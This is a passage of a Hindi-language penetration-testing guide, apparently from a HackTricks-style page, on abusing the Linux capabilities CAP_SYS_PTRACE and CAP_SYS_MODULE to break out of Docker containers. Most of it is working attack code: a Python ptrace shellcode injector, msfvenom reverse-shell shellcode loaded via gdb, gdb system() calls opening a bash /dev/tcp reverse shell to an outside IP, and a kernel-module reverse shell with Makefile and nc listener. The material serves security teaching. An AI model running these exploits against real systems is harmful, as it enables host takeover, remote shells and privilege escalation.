mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдВрджрд░ рдЪрд▓ рд░рд╣реЗ рдХрд┐рд╕реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╢реЗрд▓рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдХреЗ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддреЗ рд╣реИрдВред** рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдВрджрд░ рдЪрд▓ рд░рд╣реА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрдВрдЯреЗрдирд░ рдХреЛ рдХрдо рд╕реЗ рдХрдо **`--pid=host`** рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдирд╛ рд╣реЛрдЧрд╛ред

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** `ptrace(2)` рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рдбрд┐рдмрдЧрд┐рдВрдЧ рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдЯреНрд░реЗрд╕рд┐рдВрдЧ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдФрд░ `process_vm_readv(2)` рдФрд░ `process_vm_writev(2)` рдЬреИрд╕реЗ рдХреНрд░реЙрд╕-рдореЗрдореЛрд░реА рдЕрдЯреИрдЪ рдХреЙрд▓реНрд╕ред рд╣рд╛рд▓рд╛рдВрдХрд┐ рдпрд╣ рдирд┐рджрд╛рди рдФрд░ рдирд┐рдЧрд░рд╛рдиреА рдХреЗ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рд╣реИ, рдпрджрд┐ `CAP_SYS_PTRACE` рдХреЛ `ptrace(2)` рдкрд░ рдПрдХ рд╕реЗрдХрдореНрдк рдлрд╝рд┐рд▓реНрдЯрд░ рдЬреИрд╕реЗ рдкреНрд░рддрд┐рдмрдВрдзрд╛рддреНрдордХ рдЙрдкрд╛рдпреЛрдВ рдХреЗ рдмрд┐рдирд╛ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╕рд┐рд╕реНрдЯрдо рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд░реВрдк рд╕реЗ рдХрдордЬреЛрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдиреНрдп рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рджрд░рдХрд┐рдирд╛рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЙрди рдкрд░ рдЬреЛ рд╕реЗрдХрдореНрдк рджреНрд╡рд╛рд░рд╛ рд▓рдЧрд╛рдП рдЧрдП рд╣реИрдВ, рдЬреИрд╕рд╛ рдХрд┐ [рдЗрд╕ рддрд░рд╣ рдХреЗ рдкреНрд░рдорд╛рдгреЛрдВ (PoC) рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ](https://gist.github.com/thejh/8346f47e359adecd1d53)ред

**Example with binary (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг (gdb)**

`gdb` рдХреЗ рд╕рд╛рде `ptrace` рдХреНрд╖рдорддрд╛:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
```markdown
msfvenom рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╢реЗрд▓рдХреЛрдб рдмрдирд╛рдПрдВ рдЬрд┐рд╕реЗ gdb рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдореЗрдореЛрд░реА рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ
```
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Debug рдПрдХ рд░реВрдЯ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ gdb рдХреЗ рд╕рд╛рде рдХрд░реЗрдВ рдФрд░ рдкрд╣рд▓реЗ рдЙрддреНрдкрдиреНрди gdb рд▓рд╛рдЗрдиреЛрдВ рдХреЛ рдХреЙрдкреА-рдкреЗрд╕реНрдЯ рдХрд░реЗрдВ:
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Example with environment (Docker breakout) - Another gdb Abuse**

рдпрджрд┐ **GDB** рд╕реНрдерд╛рдкрд┐рдд рд╣реИ (рдпрд╛ рдЖрдк рдЗрд╕реЗ `apk add gdb` рдпрд╛ `apt install gdb` рдХреЗ рд╕рд╛рде рд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП) рддреЛ рдЖрдк **рд╣реЛрд╕реНрдЯ рд╕реЗ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдбрд┐рдмрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЗрд╕реЗ `system` рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред (рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рд▓рд┐рдП рднреА `SYS_ADMIN` рдХреНрд╖рдорддрд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
рдЖрдк рдХрдорд╛рдВрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рдирд╣реАрдВ рджреЗрдЦ рдкрд╛рдПрдВрдЧреЗ рд▓реЗрдХрд┐рди рдпрд╣ рдЙрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ (рддреЛ рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ)ред

{% hint style="warning" %}
рдпрджрд┐ рдЖрдкрдХреЛ рддреНрд░реБрдЯрд┐ "No symbol "system" in current context." рдорд┐рд▓рддреА рд╣реИ, рддреЛ gdb рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдореЗрдВ рд╢реЗрд▓рдХреЛрдб рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдг рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред
{% endhint %}

**рдкрд░реНрдпрд╛рд╡рд░рдг рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг (Docker рдмреНрд░реЗрдХрдЖрдЙрдЯ) - рд╢реЗрд▓рдХреЛрдб рдЗрдВрдЬреЗрдХреНрд╢рди**

рдЖрдк рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд╕рдХреНрд╖рдо рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
List **processes** running in the **host** `ps -eaf`

1. Get the **architecture** `uname -m`
2. Find a **shellcode** for the architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Find a **program** to **inject** the **shellcode** into a process memory ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. **Modify** the **shellcode** inside the program and **compile** it `gcc inject.c -o inject`
5. **Inject** it and grab your **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ **рдХрд░реНрдиреЗрд▓ рдореЙрдбреНрдпреВрд▓реНрд╕ рдХреЛ рд▓реЛрдб рдФрд░ рдЕрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (`init_module(2)`, `finit_module(2)` рдФрд░ `delete_module(2)` рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓)**, рдЬреЛ рдХрд░реНрдиреЗрд▓ рдХреЗ рдореБрдЦреНрдп рд╕рдВрдЪрд╛рд▓рди рддрдХ рд╕реАрдзреА рдкрд╣реБрдБрдЪ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдХреНрд╖рдорддрд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдо рдкреНрд░рд╕реНрддреБрдд рдХрд░рддреА рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдФрд░ рдХреБрд▓ рдкреНрд░рдгрд╛рд▓реА рдХреЗ рд╕рдордЭреМрддреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХрд░реНрдиреЗрд▓ рдореЗрдВ рд╕рдВрд╢реЛрдзрди рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╕рднреА Linux рд╕реБрд░рдХреНрд╖рд╛ рддрдВрддреНрд░реЛрдВ, рдЬрд┐рд╕рдореЗрдВ Linux рд╕реБрд░рдХреНрд╖рд╛ рдореЙрдбреНрдпреВрд▓ рдФрд░ рдХрдВрдЯреЗрдирд░ рдЕрд▓рдЧрд╛рд╡ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ, рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред  
**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк** **рдХрд░реНрдиреЗрд▓ рдореЙрдбреНрдпреВрд▓реНрд╕ рдХреЛ рд╣реЛрд╕реНрдЯ рдорд╢реАрди рдХреЗ рдХрд░реНрдиреЗрд▓ рдореЗрдВ/рд╕реЗ рдбрд╛рд▓/рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред**

**Example with binary**

In the following example the binary **`python`** has this capability.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, **`modprobe`** рдХрдорд╛рдВрдб рдирд┐рд░реНрднрд░рддрд╛ рд╕реВрдЪреА рдФрд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ **`/lib/modules/$(uname -r)`** рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдЬрд╛рдВрдЪрддрд╛ рд╣реИред\
рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЪрд▓рд┐рдП рдПрдХ рдирдХрд▓реА **lib/modules** рдлрд╝реЛрд▓реНрдбрд░ рдмрдирд╛рддреЗ рд╣реИрдВ:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
рдлрд┐рд░ **рдХрд░реНрдиреЗрд▓ рдореЙрдбреНрдпреВрд▓ рдХреЛ рд╕рдВрдХрд▓рд┐рдд рдХрд░реЗрдВ, рдЖрдк рдиреАрдЪреЗ 2 рдЙрджрд╛рд╣рд░рдг рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдЗрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдХреЙрдкреА рдХрд░реЗрдВ:**
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
рдЕрдВрдд рдореЗрдВ, рдЗрд╕ рдХрд░реНрдиреЗрд▓ рдореЙрдбреНрдпреВрд▓ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдкрд╛рдпрдерди рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Example 2 with binary**

In the following example the binary **`kmod`** has this capability.  
**рдЙрджрд╛рд╣рд░рдг 2 рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде**

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдмрд╛рдЗрдирд░реА **`kmod`** рдХреЗ рдкрд╛рд╕ рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реИред
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **`insmod`** рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдХрд░реНрдиреЗрд▓ рдореЙрдбреНрдпреВрд▓ рдбрд╛рд▓рдирд╛ рд╕рдВрднрд╡ рд╣реИред рдЗрд╕ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП **reverse shell** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдЙрджрд╛рд╣рд░рдг рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВред

**рдкрд░реНрдпрд╛рд╡рд░рдг рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг (Docker рдмреНрд░реЗрдХрдЖрдЙрдЯ)**

рдЖрдк docker рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд╕рдХреНрд╖рдо рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Inside the previous output you can see that the **SYS\_MODULE** capability is enabled.

**рдПрдХ** **рдХрд░реНрдиреЗрд▓ рдореЙрдбреНрдпреВрд▓** рдмрдирд╛рдПрдВ рдЬреЛ рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛ рдФрд░ **Makefile** рдХреЛ **рд╕рдВрдХрд▓рд┐рдд** рдХрд░реЗрдЧрд╛:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% endcode %}

{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Makefile рдореЗрдВ рдкреНрд░рддреНрдпреЗрдХ make рд╢рдмреНрдж рд╕реЗ рдкрд╣рд▓реЗ рдХрд╛ рдЦрд╛рд▓реА рдЪрд░ **рдПрдХ рдЯреИрдм рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рд╕реНрдкреЗрд╕ рдирд╣реАрдВ**!
{% endhint %}

`make` рдЪрд▓рд╛рдПрдБ рдЗрд╕реЗ рд╕рдВрдХрд▓рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
рдЕрдВрдд рдореЗрдВ, рдПрдХ рд╢реЗрд▓ рдХреЗ рдЕрдВрджрд░ `nc` рд╢реБрд░реВ рдХрд░реЗрдВ рдФрд░ **рдореЙрдбреНрдпреВрд▓ рд▓реЛрдб рдХрд░реЗрдВ** рдПрдХ рдЕрдиреНрдп рд╕реЗ рдФрд░ рдЖрдк nc рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╢реЗрд▓ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░реЗрдВрдЧреЗ:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдХреЛрдб "SYS\_MODULE рдХреНрд╖рдорддрд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ" рдХреЗ рдкреНрд░рдпреЛрдЧрд╢рд╛рд▓рд╛ рд╕реЗ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдПрдХ рдФрд░ рдЙрджрд╛рд╣рд░рдг [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) рдкрд░ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ **рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝рдиреЗ рдФрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЛ рдкрдврд╝рдиреЗ рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдкреНрд░рд╛рдердорд┐рдХ рдЙрдкрдпреЛрдЧ рдлрд╛рдЗрд▓ рдЦреЛрдЬрдиреЗ рдпрд╛ рдкрдврд╝рдиреЗ рдХреЗ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрд╣ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ `open_by_handle_at(2)` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рднреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬреЛ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рд╡реЗ рдлрд╝рд╛рдЗрд▓реЗрдВ рднреА рд╢рд╛рдорд┐рд▓ рд╣реИрдВ рдЬреЛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдорд╛рдЙрдВрдЯ рдирд╛рдорд╕реНрдкреЗрд╕ рдХреЗ рдмрд╛рд╣рд░ рд╣реИрдВред `open_by_handle_at(2)` рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рд╣реИрдВрдбрд▓ рдПрдХ рдЧреИрд░-рдкреНрд░рддреНрдпрдХреНрд╖ рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬреЛ `name_to_handle_at(2)` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ 